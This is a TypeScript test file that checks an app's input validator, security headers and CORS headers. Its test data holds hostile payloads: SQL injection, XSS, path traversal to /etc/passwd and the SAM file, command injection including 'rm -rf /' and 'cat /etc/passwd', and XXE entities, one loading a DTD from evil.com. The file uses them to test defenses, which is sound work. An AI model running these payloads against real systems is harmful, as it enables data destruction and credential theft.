// src/tests/enhanced-security-validation.test.ts
import { securityService } from '../services/security/securityService';
import { securityHeaders } from '../services/security/securityHeaders';

/**
 * Enhanced Security Validation Tests
 * Tests the new OWASP-based security enhancements
 */

// OWASP Top 10 test cases
const owaspTestCases = {
  sqlInjection: [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT * FROM users--",
    "%27%20OR%201=1--",
    "1; DELETE FROM products WHERE 1=1--",
  ],
  
  xss: [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<%3Cscript%3Ealert('XSS')%3C/script%3E",
    "<svg onload=alert('XSS')>",
  ],
  
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "../../../var/log/apache/access.log",
  ],
  
  commandInjection: [
    "; cat /etc/passwd",
    "| whoami",
    "&& rm -rf /",
    "`id`",
    "$(whoami)",
    "; ping -c 10 127.0.0.1",
  ],
  
  ldapInjection: [
    "*)(uid=*",
    "*)(|(password=*))",
    "admin)(&(password=*))",
    "*))%00",
    "*))(|(cn=*))",
  ],
  
  xmlInjection: [
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">',
    '<!ENTITY % file SYSTEM "file:///etc/passwd">',
  ],
};

/**
 * Test OWASP SQL Injection Protection
 */
export function testSQLInjectionProtection(): { passed: number; failed: number; errors: string[] } {
  const errors: string[] = [];
  let passed = 0;
  let failed = 0;

  console.log('🛡️ Testing OWASP SQL Injection Protection...');

  owaspTestCases.sqlInjection.forEach(payload => {
    const result = securityService.validateInputEnhanced(payload, 'text');
    
    if (!result.valid && result.threat === 'sqlInjection') {
      passed++;
      console.log(`✅ SQL injection blocked: ${payload.substring(0, 20)}...`);
    } else {
      failed++;
      errors.push(`❌ SQL injection not detected: ${payload}`);
    }
  });

  return { passed, failed, errors };
}

/**
 * Test OWASP XSS Protection
 */
export function testXSSProtection(): { passed: number; failed: number; errors: string[] } {
  const errors: string[] = [];
  let passed = 0;
  let failed = 0;

  console.log('🛡️ Testing OWASP XSS Protection...');

  owaspTestCases.xss.forEach(payload => {
    const result = securityService.validateInputEnhanced(payload, 'text');
    
    if (!result.valid && result.threat === 'xss') {
      passed++;
      console.log(`✅ XSS attack blocked: ${payload.substring(0, 20)}...`);
    } else {
      failed++;
      errors.push(`❌ XSS attack not detected: ${payload}`);
    }
  });

  return { passed, failed, errors };
}

/**
 * Test Path Traversal Protection
 */
export function testPathTraversalProtection(): { passed: number; failed: number; errors: string[] } {
  const errors: string[] = [];
  let passed = 0;
  let failed = 0;

  console.log('🛡️ Testing Path Traversal Protection...');

  owaspTestCases.pathTraversal.forEach(payload => {
    const result = securityService.validateInputEnhanced(payload, 'filename');
    
    if (!result.valid && result.threat === 'pathTraversal') {
      passed++;
      console.log(`✅ Path traversal blocked: ${payload.substring(0, 20)}...`);
    } else {
      failed++;
      errors.push(`❌ Path traversal not detected: ${payload}`);
    }
  });

  return { passed, failed, errors };
}

/**
 * Test Command Injection Protection
 */
export function testCommandInjectionProtection(): { passed: number; failed: number; errors: string[] } {
  const errors: string[] = [];
  let passed = 0;
  let failed = 0;

  console.log('🛡️ Testing Command Injection Protection...');

  owaspTestCases.commandInjection.forEach(payload => {
    const result = securityService.validateInputEnhanced(payload, 'text');
    
    if (!result.valid && result.threat === 'commandInjection') {
      passed++;
      console.log(`✅ Command injection blocked: ${payload.substring(0, 20)}...`);
    } else {
      failed++;
      errors.push(`❌ Command injection not detected: ${payload}`);
    }
  });

  return { passed, failed, errors };
}

/**
 * Test Security Headers
 */
export function testSecurityHeaders(): { passed: number; failed: number; errors: string[] } {
  const errors: string[] = [];
  let passed = 0;
  let failed = 0;

  console.log('🛡️ Testing Security Headers...');

  // Initialize security headers
  securityHeaders.initialize({
    enableCSP: true,
    enableHSTS: true,
    enableXFrameOptions: true,
    enableXContentTypeOptions: true,
    enableXXSSProtection: true,
    enableReferrerPolicy: true,
    enablePermissionsPolicy: true,
    environment: 'production',
  });

  // Test API headers
  const apiHeaders = securityHeaders.getHeadersForRequestType('api', 'test-user');
  
  const requiredHeaders = [
    'Content-Security-Policy',
    'X-Frame-Options',
    'X-Content-Type-Options',
    'X-XSS-Protection',
    'Referrer-Policy',
    'Cross-Origin-Embedder-Policy',
    'Cross-Origin-Opener-Policy',
    'Cross-Origin-Resource-Policy',
  ];

  requiredHeaders.forEach(header => {
    if (apiHeaders[header]) {
      passed++;
      console.log(`✅ Security header present: ${header}`);
    } else {
      failed++;
      errors.push(`❌ Missing security header: ${header}`);
    }
  });

  // Test header values
  if (apiHeaders['X-Frame-Options'] === 'DENY') {
    passed++;
    console.log('✅ X-Frame-Options correctly set to DENY');
  } else {
    failed++;
    errors.push('❌ X-Frame-Options not set to DENY');
  }

  if (apiHeaders['X-Content-Type-Options'] === 'nosniff') {
    passed++;
    console.log('✅ X-Content-Type-Options correctly set to nosniff');
  } else {
    failed++;
    errors.push('❌ X-Content-Type-Options not set to nosniff');
  }

  return { passed, failed, errors };
}

/**
 * Test Input Type Validation
 */
export function testInputTypeValidation(): { passed: number; failed: number; errors: string[] } {
  const errors: string[] = [];
  let passed = 0;
  let failed = 0;

  console.log('🛡️ Testing Input Type Validation...');

  const testCases = [
    { input: 'user@example.com', type: 'email' as const, shouldPass: true },
    { input: 'invalid-email', type: 'email' as const, shouldPass: false },
    { input: 'SecurePass123!', type: 'password' as const, shouldPass: true },
    { input: '123', type: 'password' as const, shouldPass: false },
    { input: 'https://example.com', type: 'url' as const, shouldPass: true },
    { input: 'javascript:alert(1)', type: 'url' as const, shouldPass: false },
    { input: 'document.pdf', type: 'filename' as const, shouldPass: true },
    { input: '../../../etc/passwd', type: 'filename' as const, shouldPass: false },
    { input: '{"valid": "json"}', type: 'json' as const, shouldPass: true },
    { input: '{invalid json}', type: 'json' as const, shouldPass: false },
  ];

  testCases.forEach(({ input, type, shouldPass }) => {
    const result = securityService.validateInputEnhanced(input, type);
    
    if (result.valid === shouldPass) {
      passed++;
      console.log(`✅ ${type} validation correct for: ${input.substring(0, 20)}...`);
    } else {
      failed++;
      errors.push(`❌ ${type} validation failed for: ${input}`);
    }
  });

  return { passed, failed, errors };
}

/**
 * Test CORS Headers
 */
export function testCORSHeaders(): { passed: number; failed: number; errors: string[] } {
  const errors: string[] = [];
  let passed = 0;
  let failed = 0;

  console.log('🛡️ Testing CORS Headers...');

  const corsHeaders = securityHeaders.getCORSHeaders('https://pharmaguide.app');
  
  const requiredCORSHeaders = [
    'Access-Control-Allow-Origin',
    'Access-Control-Allow-Methods',
    'Access-Control-Allow-Headers',
    'Access-Control-Max-Age',
  ];

  requiredCORSHeaders.forEach(header => {
    if (corsHeaders[header]) {
      passed++;
      console.log(`✅ CORS header present: ${header}`);
    } else {
      failed++;
      errors.push(`❌ Missing CORS header: ${header}`);
    }
  });

  return { passed, failed, errors };
}

/**
 * Run all enhanced security tests
 */
export async function runEnhancedSecurityTests(): Promise<void> {
  console.log('🔒 Starting Enhanced OWASP Security Validation Tests\n');

  // Initialize security services
  securityService.initialize({
    enableInputSanitization: true,
    enableRateLimiting: false, // Disable for testing
    maxRequestsPerMinute: 1000,
    enableSQLInjectionProtection: true,
    enableXSSProtection: true,
    enableCSRFProtection: true,
    enableOWASPValidation: true,
    enablePathTraversalProtection: true,
    enableCommandInjectionProtection: true,
  });

  const results = {
    sqlInjection: testSQLInjectionProtection(),
    xss: testXSSProtection(),
    pathTraversal: testPathTraversalProtection(),
    commandInjection: testCommandInjectionProtection(),
    securityHeaders: testSecurityHeaders(),
    inputTypeValidation: testInputTypeValidation(),
    corsHeaders: testCORSHeaders(),
  };

  // Calculate totals
  const totalPassed = Object.values(results).reduce((sum, result) => sum + result.passed, 0);
  const totalFailed = Object.values(results).reduce((sum, result) => sum + result.failed, 0);
  const allErrors = Object.values(results).flatMap(result => result.errors);

  console.log('\n📊 Enhanced Security Test Results:');
  console.log(`✅ Passed: ${totalPassed}`);
  console.log(`❌ Failed: ${totalFailed}`);
  console.log(`🛡️ Security Score: ${Math.round((totalPassed / (totalPassed + totalFailed)) * 100)}%`);

  if (allErrors.length > 0) {
    console.log('\n❌ Errors:');
    allErrors.forEach(error => console.log(error));
  }

  if (totalFailed === 0) {
    console.log('\n🎉 All enhanced security tests passed! Your app is well protected.');
  } else {
    console.log(`\n⚠️ ${totalFailed} security issues found. Please review and fix.`);
  }
}
